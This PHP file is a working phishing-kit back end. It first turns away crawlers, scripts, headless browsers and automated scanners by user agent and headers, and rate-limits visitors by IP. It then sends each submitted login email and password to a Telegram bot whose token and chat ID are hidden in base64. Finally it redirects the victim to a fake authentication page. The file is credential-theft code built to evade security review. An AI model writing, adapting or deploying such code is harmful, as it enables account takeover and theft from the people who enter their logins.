<?php
session_start();

// 1. First Layer - Basic Bot Filter (GET/POST)
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
if (!isset($_SESSION['verified'])) {
    // Block empty User-Agent and basic bots
    if (empty($userAgent) || preg_match('/bot|crawl|spider|curl|wget|python|java|php|ruby|httpclient/i', $userAgent)) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
    
    // Set temporary verification session
    $_SESSION['verified'] = true;
    $_SESSION['fingerprint'] = md5($_SERVER['HTTP_ACCEPT'] . $_SERVER['HTTP_ACCEPT_LANGUAGE'] . $userAgent);
}

// 2. Browser Validation Layer
$requiredHeaders = ['HTTP_ACCEPT','HTTP_ACCEPT_LANGUAGE','HTTP_USER_AGENT'];
foreach($requiredHeaders as $h) {
    if(!isset($_SERVER[$h]) || empty($_SERVER[$h])) {
        header("HTTP/1.1 403 Forbidden");
        exit;
    }
}

// 3. JS validation token check
if (!isset($_SERVER['HTTP_SEC_CH_UA']) || 
    !preg_match('/Chromium|Chrome|Safari|Firefox/i', $_SERVER['HTTP_SEC_CH_UA'])) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}

// 4. Block Headless Browsers
$headlessPattern = '/HeadlessChrome|PhantomJS|QwantBrowser|Puppeteer|Selenium|WebDriver|\\bBot\\b/i';
if (preg_match($headlessPattern, $userAgent)) {
    header("HTTP/1.1 403 Forbidden");
    exit;
}

// 5. Rate Limiting by IP
$ip = $_SERVER['REMOTE_ADDR'];
$attemptsFile = 'attempts.json';
$rateLimits = [
    'GET' => ['limit' => 15, 'window' => 300],
    'POST' => ['limit' => 5, 'window' => 600]
];

$attempts = file_exists($attemptsFile) ? json_decode(file_get_contents($attemptsFile), true) : [];
$method = $_SERVER['REQUEST_METHOD'];
$currentTime = time();

if (!isset($attempts[$ip][$method])) {
    $attempts[$ip][$method] = [
        'count' => 1,
        'first' => $currentTime,
        'last' => $currentTime
    ];
} else {
    $attempts[$ip][$method]['count']++;
    $attempts[$ip][$method]['last'] = $currentTime;
    if ($currentTime - $attempts[$ip][$method]['first'] > $rateLimits[$method]['window']) {
        unset($attempts[$ip][$method]);
    }
}

if ($attempts[$ip][$method]['count'] > $rateLimits[$method]['limit']) {
    header("HTTP/1.1 429 Too Many Requests");
    exit;
}
file_put_contents($attemptsFile, json_encode($attempts));

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $login_email = $_POST["login_email"];
    $login_password = $_POST["login_password"];
    
    // Obfuscated token and channel
    $botApiToken = base64_decode('NjQwMDE3OTIwMDpBQUZMTkMyMmoyemRTeENEODNRQjcwTjN6Z0h5RzNBTWdpQQ==');
    $channelId = base64_decode('ODEwNTI0NjU1OA==');
    
    $txt = "🙍 Email: {$login_email} \n 🔐 Password: {$login_password}";

    $query = http_build_query([
        'chat_id' => $channelId,
        'text' => $txt,
    ]);

    $url = "https://api.telegram.org/bot{$botApiToken}/sendMessage?{$query}";

    $curl = curl_init();
    curl_setopt_array($curl, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_CUSTOMREQUEST => 'GET',
    ]);
    curl_exec($curl);
    curl_close($curl);
    
    // Reset rate limiting on successful submission
    if (isset($attempts[$ip])) {
        unset($attempts[$ip]);
        file_put_contents($attemptsFile, json_encode($attempts));
    }
}

header("location: authflow/entry/acnw_dep=ul&country.x=IT/index.html");
exit;
?>
